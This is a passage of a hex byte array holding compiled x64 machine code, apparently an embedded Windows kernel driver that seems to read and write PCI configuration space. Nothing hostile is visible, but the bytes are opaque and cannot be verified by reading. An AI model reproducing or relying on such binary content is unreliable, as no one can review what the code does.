    0x00, 0x41, 0xB8, 0xF3, 0x00, 0x00, 0x00, 0x48, 0x8B, 0xCF, 0xE8, 0x71, 0xE4, 0xFF, 0xFF, 0x4C,
    0x8B, 0x64, 0x24, 0x38, 0x48, 0x8B, 0x7C, 0x24, 0x40, 0x48, 0x8B, 0x74, 0x24, 0x48, 0x48, 0x8B,
    0x6C, 0x24, 0x50, 0x8B, 0xC3, 0x48, 0x8B, 0x5C, 0x24, 0x78, 0x48, 0x83, 0xC4, 0x58, 0xC3, 0xCC,
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x83, 0xEC, 0x38, 0x4D, 0x85, 0xC0, 0x48, 0x89, 0x5C, 0x24, 0x58, 0x48, 0x89, 0x7C, 0x24,
    0x30, 0x8B, 0xFA, 0x49, 0x8B, 0xD8, 0x74, 0x45, 0xE8, 0xA3, 0xFB, 0xFF, 0xFF, 0x48, 0x85, 0xC0,
    0x74, 0x3B, 0x44, 0x8D, 0x0C, 0xBD, 0x00, 0x00, 0x00, 0x00, 0x41, 0xB0, 0x0F, 0x48, 0x8B, 0xD3,
    0x48, 0x8B, 0xC8, 0xC7, 0x44, 0x24, 0x20, 0x04, 0x00, 0x00, 0x00, 0xE8, 0xA0, 0xF2, 0xFF, 0xFF,
    0x33, 0xD2, 0xB9, 0x09, 0x40, 0x6A, 0xC8, 0x85, 0xC0, 0x0F, 0x49, 0xCA, 0x8B, 0xC1, 0x48, 0x8B,
    0x7C, 0x24, 0x30, 0x48, 0x8B, 0x5C, 0x24, 0x58, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0x48, 0x8B, 0x7C,
    0x24, 0x30, 0x48, 0x8B, 0x5C, 0x24, 0x58, 0xB8, 0x02, 0x40, 0x6A, 0xC8, 0x48, 0x83, 0xC4, 0x38,
    0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x44, 0x89, 0x44, 0x24, 0x18, 0x48, 0x81, 0xEC, 0x88, 0x00, 0x00, 0x00, 0x48, 0x89, 0x9C, 0x24,
    0xA8, 0x00, 0x00, 0x00, 0x48, 0x89, 0x7C, 0x24, 0x78, 0x8B, 0xFA, 0xE8, 0x20, 0xFB, 0xFF, 0xFF,
    0x48, 0x85, 0xC0, 0x48, 0x8B, 0xD8, 0x0F, 0x84, 0xD4, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24,
    0x58, 0x45, 0x33, 0xC0, 0x33, 0xD2, 0x48, 0x89, 0xB4, 0x24, 0x80, 0x00, 0x00, 0x00, 0xFF, 0x15,
    0x84, 0x26, 0x00, 0x00, 0x33, 0xF6, 0x4C, 0x8D, 0x5C, 0x24, 0x48, 0x48, 0x8D, 0x44, 0x24, 0x58,
    0x8D, 0x4E, 0x1B, 0x4C, 0x89, 0x5C, 0x24, 0x30, 0x48, 0x89, 0x44, 0x24, 0x28, 0x45, 0x33, 0xC9,
    0x45, 0x33, 0xC0, 0x48, 0x8B, 0xD3, 0x48, 0x89, 0x74, 0x24, 0x20, 0xFF, 0x15, 0x4F, 0x26, 0x00,
    0x00, 0x48, 0x85, 0xC0, 0x48, 0x8B, 0xD0, 0x74, 0x6D, 0x48, 0x8B, 0x88, 0xB8, 0x00, 0x00, 0x00,
    0x48, 0x83, 0xE9, 0x48, 0x74, 0x60, 0xC7, 0x40, 0x30, 0xBB, 0x00, 0x00, 0xC0, 0x48, 0x8D, 0x84,
    0x24, 0xA0, 0x00, 0x00, 0x00, 0xC6, 0x01, 0x1B, 0x48, 0x89, 0x41, 0x10, 0x8D, 0x04, 0xBD, 0x00,
    0x00, 0x00, 0x00, 0xC6, 0x41, 0x01, 0x10, 0xC7, 0x41, 0x20, 0x04, 0x00, 0x00, 0x00, 0x89, 0x71,
    0x08, 0x89, 0x41, 0x18, 0x48, 0x8B, 0xCB, 0xFF, 0x15, 0xFB, 0x25, 0x00, 0x00, 0x3D, 0x03, 0x01,
    0x00, 0x00, 0x44, 0x8B, 0xD8, 0x75, 0x24, 0x48, 0x8D, 0x4C, 0x24, 0x58, 0x45, 0x33, 0xC9, 0x45,
    0x33, 0xC0, 0x33, 0xD2, 0x48, 0x89, 0x74, 0x24, 0x20, 0xFF, 0x15, 0xD1, 0x25, 0x00, 0x00, 0x44,
    0x8B, 0x5C, 0x24, 0x48, 0xEB, 0x05, 0x44, 0x8B, 0x5C, 0x24, 0x40, 0xB8, 0x09, 0x40, 0x6A, 0xC8,
    0x45, 0x85, 0xDB, 0x0F, 0x49, 0xC6, 0x48, 0x8B, 0xB4, 0x24, 0x80, 0x00, 0x00, 0x00, 0xEB, 0x05,
    0xB8, 0x02, 0x40, 0x6A, 0xC8, 0x48, 0x8B, 0x7C, 0x24, 0x78, 0x48, 0x8B, 0x9C, 0x24, 0xA8, 0x00,
    0x00, 0x00, 0x48, 0x81, 0xC4, 0x88, 0x00, 0x00, 0x00, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x8B, 0xC4, 0x48, 0x81, 0xEC, 0x88, 0x01, 0x00, 0x00, 0x48, 0x89, 0x58, 0xF8, 0x48, 0x89,
    0x68, 0xF0, 0x48, 0x89, 0x70, 0xE8, 0x48, 0x89, 0x78, 0xE0, 0x4C, 0x89, 0x60, 0xD8, 0x4C, 0x89,
    0x68, 0xD0, 0x4C, 0x8B, 0xE9, 0x41, 0x8B, 0xF9, 0x41, 0x0F, 0xB6, 0xD8, 0x8B, 0xF2, 0x41, 0xBC,
    0x02, 0x40, 0x6A, 0xC8, 0xC7, 0x44, 0x24, 0x30, 0x00, 0x00, 0x00, 0x00, 0xE8, 0xDF, 0xF9, 0xFF,
    0xFF, 0x48, 0x85, 0xC0, 0x48, 0x8B, 0xE8, 0x0F, 0x84, 0x50, 0x01, 0x00, 0x00, 0x45, 0x33, 0xE4,
    0x80, 0xFB, 0x0F, 0x75, 0x27, 0x48, 0x8D, 0x4C, 0x24, 0x40, 0x49, 0x8B, 0xD5, 0x41, 0xB8, 0x08,
    0x01, 0x00, 0x00, 0xE8, 0x28, 0x07, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x40, 0x44, 0x8B, 0xC7,
    0x8B, 0xD6, 0xE8, 0x69, 0xFE, 0xFF, 0xFF, 0xE9, 0x24, 0x01, 0x00, 0x00, 0x80, 0xFB, 0x03, 0x75,
    0x2E, 0x0F, 0xB7, 0xC7, 0x44, 0x8D, 0x0C, 0xB5, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x54, 0x24,
    0x30, 0x41, 0xB0, 0x10, 0x48, 0x8B, 0xCD, 0xC7, 0x44, 0x24, 0x20, 0x02, 0x00, 0x00, 0x00, 0x89,
    0x44, 0x24, 0x30, 0xE8, 0x98, 0xF0, 0xFF, 0xFF, 0x33, 0xC0, 0xE9, 0xF1, 0x00, 0x00, 0x00, 0x80,
    0xFB, 0x0C, 0x75, 0x2E, 0x44, 0x8D, 0x0C, 0xB5, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x54, 0x24,
    0x30, 0xC1, 0xEF, 0x10, 0x41, 0xB0, 0x10, 0x48, 0x8B, 0xC8, 0xC7, 0x44, 0x24, 0x20, 0x02, 0x00,
    0x00, 0x00, 0x89, 0x7C, 0x24, 0x30, 0xE8, 0x65, 0xF0, 0xFF, 0xFF, 0x33, 0xC0, 0xE9, 0xBE, 0x00,
    0x00, 0x00, 0xF6, 0xC3, 0x01, 0x74, 0x28, 0x40, 0x0F, 0xB6, 0xC7, 0x44, 0x8D, 0x0C, 0xB5, 0x00,
    0x00, 0x00, 0x00, 0x48, 0x8D, 0x54, 0x24, 0x30, 0x41, 0xB0, 0x10, 0x48, 0x8B, 0xCD, 0xC7, 0x44,
    0x24, 0x20, 0x01, 0x00, 0x00, 0x00, 0x89, 0x44, 0x24, 0x30, 0xE8, 0x31, 0xF0, 0xFF, 0xFF, 0xF6,
    0xC3, 0x02, 0x74, 0x2C, 0x8B, 0xC7, 0x44, 0x8D, 0x0C, 0xB5, 0x01, 0x00, 0x00, 0x00, 0x48, 0x8D,
    0x54, 0x24, 0x30, 0xC1, 0xE8, 0x08, 0x41, 0xB0, 0x10, 0x48, 0x8B, 0xCD, 0x0F, 0xB6, 0xC0, 0xC7,
    0x44, 0x24, 0x20, 0x01, 0x00, 0x00, 0x00, 0x89, 0x44, 0x24, 0x30, 0xE8, 0x00, 0xF0, 0xFF, 0xFF,
    0xF6, 0xC3, 0x04, 0x74, 0x2C, 0x8B, 0xC7, 0x44, 0x8D, 0x0C, 0xB5, 0x02, 0x00, 0x00, 0x00, 0x48,
    0x8D, 0x54, 0x24, 0x30, 0xC1, 0xE8, 0x10, 0x41, 0xB0, 0x10, 0x48, 0x8B, 0xCD, 0x0F, 0xB6, 0xC0,
    0xC7, 0x44, 0x24, 0x20, 0x01, 0x00, 0x00, 0x00, 0x89, 0x44, 0x24, 0x30, 0xE8, 0xCF, 0xEF, 0xFF,
    0xFF, 0xF6, 0xC3, 0x08, 0x74, 0x27, 0xC1, 0xEF, 0x18, 0x44, 0x8D, 0x0C, 0xB5, 0x03, 0x00, 0x00,
    0x00, 0x48, 0x8D, 0x54, 0x24, 0x30, 0x41, 0xB0, 0x10, 0x48, 0x8B, 0xCD, 0xC7, 0x44, 0x24, 0x20,
    0x01, 0x00, 0x00, 0x00, 0x89, 0x7C, 0x24, 0x30, 0xE8, 0xA3, 0xEF, 0xFF, 0xFF, 0x41, 0x8B, 0xC4,
    0x4C, 0x8B, 0xAC, 0x24, 0x58, 0x01, 0x00, 0x00, 0x4C, 0x8B, 0xA4, 0x24, 0x60, 0x01, 0x00, 0x00,
    0x48, 0x8B, 0xBC, 0x24, 0x68, 0x01, 0x00, 0x00, 0x48, 0x8B, 0xB4, 0x24, 0x70, 0x01, 0x00, 0x00,
    0x48, 0x8B, 0xAC, 0x24, 0x78, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x9C, 0x24, 0x80, 0x01, 0x00, 0x00,
    0x48, 0x81, 0xC4, 0x88, 0x01, 0x00, 0x00, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x83, 0xEC, 0x28, 0x48, 0x85, 0xC9, 0x48, 0x89, 0x5C, 0x24, 0x40, 0x48, 0x89, 0x7C, 0x24,
    0x48, 0x48, 0x8B, 0xF9, 0x48, 0x8B, 0xDA, 0x0F, 0x84, 0xB9, 0x00, 0x00, 0x00, 0x48, 0x85, 0xD2,
    0x0F, 0x84, 0xB0, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x4A, 0x08, 0x48, 0x8D, 0x57, 0x08, 0x41, 0xB8,
    0x08, 0x01, 0x00, 0x00, 0xE8, 0x77, 0x05, 0x00, 0x00, 0x44, 0x0F, 0xB6, 0x9F, 0x28, 0x01, 0x00,
    0x00, 0x48, 0x8D, 0x0D, 0x28, 0x15, 0x00, 0x00, 0x44, 0x88, 0x9B, 0x28, 0x01, 0x00, 0x00, 0x48,
    0x8B, 0x07, 0x48, 0x89, 0x03, 0x48, 0x8B, 0x87, 0x10, 0x01, 0x00, 0x00, 0x48, 0x89, 0x83, 0x10,
    0x01, 0x00, 0x00, 0x48, 0x8B, 0x87, 0x20, 0x01, 0x00, 0x00, 0x48, 0x89, 0x83, 0x20, 0x01, 0x00,
    0x00, 0x48, 0x8B, 0x87, 0x18, 0x01, 0x00, 0x00, 0xC6, 0x83, 0x50, 0x01, 0x00, 0x00, 0x00, 0x48,
    0x89, 0x83, 0x18, 0x01, 0x00, 0x00, 0x8B, 0x83, 0x70, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x93, 0x18,
    0x01, 0x00, 0x00, 0x89, 0x83, 0x40, 0x01, 0x00, 0x00, 0x8B, 0x83, 0x64, 0x01, 0x00, 0x00, 0x89,
    0x83, 0x34, 0x01, 0x00, 0x00, 0x0F, 0xB6, 0x83, 0x60, 0x01, 0x00, 0x00, 0x88, 0x83, 0x30, 0x01,
    0x00, 0x00, 0x48, 0x8B, 0x83, 0x68, 0x01, 0x00, 0x00, 0x48, 0x89, 0x83, 0x38, 0x01, 0x00, 0x00,
    0xE8, 0x6B, 0xE1, 0xFF, 0xFF, 0x33, 0xC0, 0x48, 0x8B, 0x7C, 0x24, 0x48, 0x48, 0x8B, 0x5C, 0x24,
    0x40, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0x48, 0x8B, 0x7C, 0x24, 0x48, 0x48, 0x8B, 0x5C, 0x24, 0x40,
    0xB8, 0x01, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0xB8, 0x03, 0x00, 0x6A, 0xC8, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x85, 0xC9, 0x48, 0x8B, 0xD9, 0x74, 0x39, 0x80, 0xB9,
    0x29, 0x01, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x05, 0xC4, 0x14, 0x00, 0x00, 0x48, 0x8D, 0x15, 0xAD,
    0x14, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x76, 0x14, 0x00, 0x00, 0x48, 0x0F, 0x45, 0xD0, 0xE8, 0xFD,
    0xE0, 0xFF, 0xFF, 0x0F, 0xB6, 0x83, 0x29, 0x01, 0x00, 0x00, 0xC6, 0x83, 0x29, 0x01, 0x00, 0x00,
    0x00, 0x48, 0x83, 0xC4, 0x20, 0x5B, 0xC3, 0x32, 0xC0, 0x48, 0x83, 0xC4, 0x20, 0x5B, 0xC3, 0xCC,
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x53, 0x48, 0x83, 0xEC, 0x20, 0xBA, 0x30, 0x06, 0x00, 0x00, 0x33, 0xC9, 0x41, 0xB8, 0x44,
    0x64, 0x6B, 0x20, 0xFF, 0x15, 0xB7, 0x21, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x48, 0x8B, 0xD8, 0x74,
    0x13, 0x33, 0xD2, 0x41, 0xB8, 0x30, 0x06, 0x00, 0x00, 0x48, 0x8B, 0xC8, 0xE8, 0x6F, 0x07, 0x00,
    0x00, 0x48, 0x8B, 0xC3, 0x48, 0x83, 0xC4, 0x20, 0x5B, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x85, 0xC9, 0x74, 0x3E, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x83, 0xB9, 0xA8, 0x03, 0x00, 0x00,
    0x00, 0x48, 0x8B, 0xD9, 0x74, 0x14, 0x48, 0x8B, 0x89, 0x88, 0x01, 0x00, 0x00, 0xFF, 0x15, 0xE5,
    0x21, 0x00, 0x00, 0x83, 0x83, 0xA8, 0x03, 0x00, 0x00, 0xFF, 0x83, 0xBB, 0xA8, 0x03, 0x00, 0x00,
    0x00, 0x75, 0x0B, 0x33, 0xD2, 0x48, 0x8B, 0xCB, 0xFF, 0x15, 0x5A, 0x21, 0x00, 0x00, 0x48, 0x83,
    0xC4, 0x20, 0x5B, 0xC2, 0x00, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x85, 0xC9, 0x0F, 0x84, 0x92, 0x00, 0x00, 0x00, 0x53, 0x48, 0x83, 0xEC, 0x40, 0x48, 0x8B,
    0xDA, 0x48, 0x8D, 0x91, 0x98, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x30, 0xFF, 0x15, 0x8D,
    0x21, 0x00, 0x00, 0xBA, 0x04, 0x01, 0x00, 0x00, 0x41, 0xB8, 0x44, 0x64, 0x6B, 0x20, 0xB9, 0x01,
    0x00, 0x00, 0x00, 0x66, 0xC7, 0x44, 0x24, 0x20, 0x04, 0x01, 0x66, 0xC7, 0x44, 0x24, 0x22, 0x04,
    0x01, 0xFF, 0x15, 0xF9, 0x20, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x48, 0x89, 0x44, 0x24, 0x28, 0x74,
    0x45, 0x48, 0x8D, 0x54, 0x24, 0x30, 0x48, 0x8D, 0x4C, 0x24, 0x20, 0x45, 0x33, 0xC0, 0xFF, 0x15,
    0x94, 0x21, 0x00, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x28, 0x85, 0xC0, 0x78, 0x21, 0x48, 0x8B, 0xD1,
    0x48, 0x2B, 0xD9, 0x90, 0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x66, 0x90,
    0x0F, 0xB6, 0x02, 0x48, 0xFF, 0xC2, 0x84, 0xC0, 0x88, 0x44, 0x13, 0xFF, 0x75, 0xF2, 0x33, 0xD2,
    0xFF, 0x15, 0xB2, 0x20, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x40, 0x5B, 0xC2, 0x00, 0x00, 0xCC, 0xCC,
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x4C, 0x8B, 0xDC, 0x48, 0x81, 0xEC, 0xF8, 0x04, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x57, 0x31, 0x00,
    0x00, 0x48, 0x89, 0x84, 0x24, 0xE0, 0x04, 0x00, 0x00, 0x48, 0x85, 0xC9, 0x49, 0x89, 0x5B, 0x18,
    0x49, 0x89, 0x7B, 0x20, 0x48, 0x8B, 0xF9, 0xBB, 0x01, 0x00, 0x00, 0x00, 0x0F, 0x84, 0x49, 0x02,
    0x00, 0x00, 0x48, 0x8B, 0x11, 0x48, 0x8D, 0x0D, 0x14, 0x16, 0x00, 0x00, 0xE8, 0x4F, 0xDF, 0xFF,
    0xFF, 0x48, 0x8B, 0x17, 0x48, 0x8D, 0x42, 0xFF, 0x48, 0x83, 0xF8, 0x07, 0x0F, 0x87, 0x18, 0x02,
    0x00, 0x00, 0x48, 0x8D, 0x0D, 0x07, 0xC0, 0xFF, 0xFF, 0x8B, 0x84, 0x81, 0x44, 0x42, 0x00, 0x00,
    0x48, 0x03, 0xC1, 0xFF, 0xE0, 0x48, 0x83, 0xC7, 0x10, 0x74, 0x35, 0x48, 0x8D, 0x4C, 0x24, 0x20,
    0x48, 0x8D, 0x57, 0x08, 0x41, 0xB8, 0x08, 0x01, 0x00, 0x00, 0xE8, 0x91, 0x02, 0x00, 0x00, 0x48,
    0x8B, 0x1F, 0x48, 0x8D, 0x4C, 0x24, 0x20, 0x48, 0x8D, 0x93, 0x58, 0x01, 0x00, 0x00, 0xE8, 0x0D,
    0xF6, 0xFF, 0xFF, 0xFF, 0x83, 0xA8, 0x03, 0x00, 0x00, 0x33, 0xDB, 0xE9, 0xDB, 0x01, 0x00, 0x00,
    0x48, 0x8D, 0x0D, 0x59, 0x15, 0x00, 0x00, 0xE8, 0xE4, 0xDE, 0xFF, 0xFF, 0xE9, 0xCA, 0x01, 0x00,
    0x00, 0x48, 0x8D, 0x4F, 0x10, 0x48, 0x85, 0xC9, 0x74, 0x13, 0x48, 0x8D, 0x51, 0x08, 0x48, 0x8B,
    0x09, 0xE8, 0x8A, 0xFE, 0xFF, 0xFF, 0x33, 0xDB, 0xE9, 0xAE, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x0D,
    0xCC, 0x14, 0x00, 0x00, 0xE8, 0xB7, 0xDE, 0xFF, 0xFF, 0xE9, 0x9D, 0x01, 0x00, 0x00, 0x48, 0x83,
    0xC7, 0x10, 0x74, 0x0F, 0xE8, 0xD7, 0xFD, 0xFF, 0xFF, 0x33, 0xDB, 0x48, 0x89, 0x07, 0xE9, 0x88,
    0x01, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x46, 0x14, 0x00, 0x00, 0xE8, 0x91, 0xDE, 0xFF, 0xFF, 0xE9,
    0x77, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x4F, 0x10, 0x48, 0x85, 0xC9, 0x74, 0x0F, 0x48, 0x8B, 0x09,
    0xE8, 0xEB, 0xFD, 0xFF, 0xFF, 0x33, 0xDB, 0xE9, 0x5F, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0xBD,
    0x13, 0x00, 0x00, 0xE8, 0x68, 0xDE, 0xFF, 0xFF, 0xE9, 0x4E, 0x01, 0x00, 0x00, 0x48, 0x83, 0xC7,
    0x10, 0x0F, 0x84, 0x80, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8C, 0x24, 0x38, 0x01, 0x00, 0x00, 0x48,
    0x8D, 0x57, 0x08, 0x41, 0xB8, 0x08, 0x01, 0x00, 0x00, 0xE8, 0xC2, 0x01, 0x00, 0x00, 0x48, 0x8B,
    0x07, 0x44, 0x0F, 0xB6, 0x9F, 0x28, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x97, 0x30, 0x01, 0x00, 0x00,
    0x48, 0x89, 0x84, 0x24, 0x30, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x87, 0x10, 0x01, 0x00, 0x00, 0x48,
    0x89, 0x84, 0x24, 0x40, 0x02, 0x00, 0x00, 0x48, 0x8B, 0x87, 0x20, 0x01, 0x00, 0x00, 0x48, 0x8D,
    0x8C, 0x24, 0x30, 0x01, 0x00, 0x00, 0x48, 0x89, 0x84, 0x24, 0x50, 0x02, 0x00, 0x00, 0x48, 0x8B,
    0x87, 0x18, 0x01, 0x00, 0x00, 0x44, 0x88, 0x9C, 0x24, 0x58, 0x02, 0x00, 0x00, 0x48, 0x89, 0x84,
    0x24, 0x48, 0x02, 0x00, 0x00, 0xE8, 0xB6, 0xFB, 0xFF, 0xFF, 0x33, 0xDB, 0x89, 0x87, 0x38, 0x01,
    0x00, 0x00, 0xE9, 0xC4, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0xD2, 0x12, 0x00, 0x00, 0xE8, 0xCD,
    0xDD, 0xFF, 0xFF, 0xE9, 0xB3, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC7, 0x10, 0x74, 0x0E, 0xE8, 0x9D,
    0xD0, 0xFF, 0xFF, 0x33, 0xDB, 0x89, 0x07, 0xE9, 0x9F, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x4D,
    0x12, 0x00, 0x00, 0xE8, 0xA8, 0xDD, 0xFF, 0xFF, 0xE9, 0x8E, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC7,
    0x10, 0x74, 0x2E, 0x48, 0x8D, 0x4C, 0x24, 0x20, 0x48, 0x8B, 0xD7, 0x41, 0xB8, 0x08, 0x01, 0x00,
    0x00, 0xE8, 0x0A, 0x01, 0x00, 0x00, 0x0F, 0xB6, 0x97, 0x09, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x4C,
    0x24, 0x20, 0xE8, 0x69, 0xD0, 0xFF, 0xFF, 0x33, 0xDB, 0x88, 0x87, 0x08, 0x01, 0x00, 0x00, 0xEB,
    0x5A, 0x48, 0x8D, 0x0D, 0xB8, 0x11, 0x00, 0x00, 0xE8, 0x63, 0xDD, 0xFF, 0xFF, 0xEB, 0x4C, 0x48,
    0x83, 0xC7, 0x10, 0x74, 0x27, 0x48, 0x8D, 0x4C, 0x24, 0x20, 0x48, 0x8B, 0xD7, 0x41, 0xB8, 0x08,
    0x01, 0x00, 0x00, 0xE8, 0xC8, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x20, 0xE8, 0xFE, 0xD0,
    0xFF, 0xFF, 0x33, 0xDB, 0x88, 0x87, 0x08, 0x01, 0x00, 0x00, 0xEB, 0x1F, 0x48, 0x8D, 0x0D, 0x1D,
    0x11, 0x00, 0x00, 0xE8, 0x28, 0xDD, 0xFF, 0xFF, 0xEB, 0x11, 0x48, 0x8D, 0x0D, 0xDF, 0x10, 0x00,
    0x00, 0xE8, 0x1A, 0xDD, 0xFF, 0xFF, 0xBB, 0x18, 0x20, 0x6A, 0xC8, 0x48, 0x8B, 0xBC, 0x24, 0x18,
    0x05, 0x00, 0x00, 0x8B, 0xC3, 0x48, 0x8B, 0x9C, 0x24, 0x10, 0x05, 0x00, 0x00, 0x48, 0x8B, 0x8C,
    0x24, 0xE0, 0x04, 0x00, 0x00, 0xE8, 0xD6, 0x04, 0x00, 0x00, 0x48, 0x81, 0xC4, 0xF8, 0x04, 0x00,
    0x00, 0xC3, 0x66, 0x90, 0x05, 0x40, 0x00, 0x00, 0x51, 0x40, 0x00, 0x00, 0x7E, 0x40, 0x00, 0x00,
    0xA4, 0x40, 0x00, 0x00, 0xCD, 0x40, 0x00, 0x00, 0x68, 0x41, 0x00, 0x00, 0x8D, 0x41, 0x00, 0x00,
    0xCF, 0x41, 0x00, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x83, 0xEC, 0x38, 0x4C, 0x8B, 0x0D, 0x85, 0x2E, 0x00, 0x00, 0x4C, 0x8B, 0x05, 0x86, 0x2E,
    0x00, 0x00, 0x48, 0x8B, 0xD1, 0xB9, 0xF7, 0x00, 0x00, 0x00, 0x48, 0xC7, 0x44, 0x24, 0x20, 0x00,
    0x00, 0x00, 0x00, 0xFF, 0x15, 0x87, 0x1E, 0x00, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x66, 0x90, 0x66, 0x90,
    0x4C, 0x8B, 0xD9, 0x48, 0x2B, 0xD1, 0x0F, 0x86, 0x9C, 0x01, 0x00, 0x00, 0x49, 0x83, 0xF8, 0x08,
    0x72, 0x62, 0xF6, 0xC1, 0x07, 0x74, 0x37, 0xF6, 0xC1, 0x01, 0x74, 0x0C, 0x8A, 0x04, 0x0A, 0x49,
    0xFF, 0xC8, 0x88, 0x01, 0x48, 0x83, 0xC1, 0x01, 0xF6, 0xC1, 0x02, 0x74, 0x0F, 0x66, 0x8B, 0x04,
    0x0A, 0x49, 0x83, 0xE8, 0x02, 0x66, 0x89, 0x01, 0x48, 0x83, 0xC1, 0x02, 0xF6, 0xC1, 0x04, 0x74,
    0x0D, 0x8B, 0x04, 0x0A, 0x49, 0x83, 0xE8, 0x04, 0x89, 0x01, 0x48, 0x83, 0xC1, 0x04, 0x4D, 0x8B,
    0xC8, 0x49, 0xC1, 0xE9, 0x05, 0x75, 0x50, 0x4D, 0x8B, 0xC8, 0x49, 0xC1, 0xE9, 0x03, 0x74, 0x14,
    0x48, 0x8B, 0x04, 0x0A, 0x48, 0x89, 0x01, 0x48, 0x83, 0xC1, 0x08, 0x49, 0xFF, 0xC9, 0x75, 0xF0,
    0x49, 0x83, 0xE0, 0x07, 0x4D, 0x85, 0xC0, 0x75, 0x07, 0x49, 0x8B, 0xC3, 0xC3, 0x66, 0x66, 0x90,
    0x8A, 0x04, 0x0A, 0x88, 0x01, 0x48, 0xFF, 0xC1, 0x49, 0xFF, 0xC8, 0x75, 0xF3, 0x49, 0x8B, 0xC3,
    0xC3, 0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x90,
    0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x90, 0x49, 0x81, 0xF9, 0x00, 0x08, 0x00, 0x00, 0x73, 0x42,
    0x48, 0x8B, 0x04, 0x0A, 0x4C, 0x8B, 0x54, 0x0A, 0x08, 0x48, 0x83, 0xC1, 0x20, 0x48, 0x89, 0x41,
    0xE0, 0x4C, 0x89, 0x51, 0xE8, 0x48, 0x8B, 0x44, 0x0A, 0xF0, 0x4C, 0x8B, 0x54, 0x0A, 0xF8, 0x49,
    0xFF, 0xC9, 0x48, 0x89, 0x41, 0xF0, 0x4C, 0x89, 0x51, 0xF8, 0x75, 0xD4, 0x49, 0x83, 0xE0, 0x1F,
    0xE9, 0x72, 0xFF, 0xFF, 0xFF, 0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x90,
    0x66, 0x90, 0x48, 0x81, 0xFA, 0x00, 0x10, 0x00, 0x00, 0x72, 0xB5, 0xB8, 0x20, 0x00, 0x00, 0x00,
    0x0F, 0x18, 0x04, 0x0A, 0x0F, 0x18, 0x44, 0x0A, 0x40, 0x48, 0x81, 0xC1, 0x80, 0x00, 0x00, 0x00,
    0xFF, 0xC8, 0x75, 0xEC, 0x48, 0x81, 0xE9, 0x00, 0x10, 0x00, 0x00, 0xB8, 0x40, 0x00, 0x00, 0x00,
    0x4C, 0x8B, 0x0C, 0x0A, 0x4C, 0x8B, 0x54, 0x0A, 0x08, 0x4C, 0x0F, 0xC3, 0x09, 0x4C, 0x0F, 0xC3,
    0x51, 0x08, 0x4C, 0x8B, 0x4C, 0x0A, 0x10, 0x4C, 0x8B, 0x54, 0x0A, 0x18, 0x4C, 0x0F, 0xC3, 0x49,
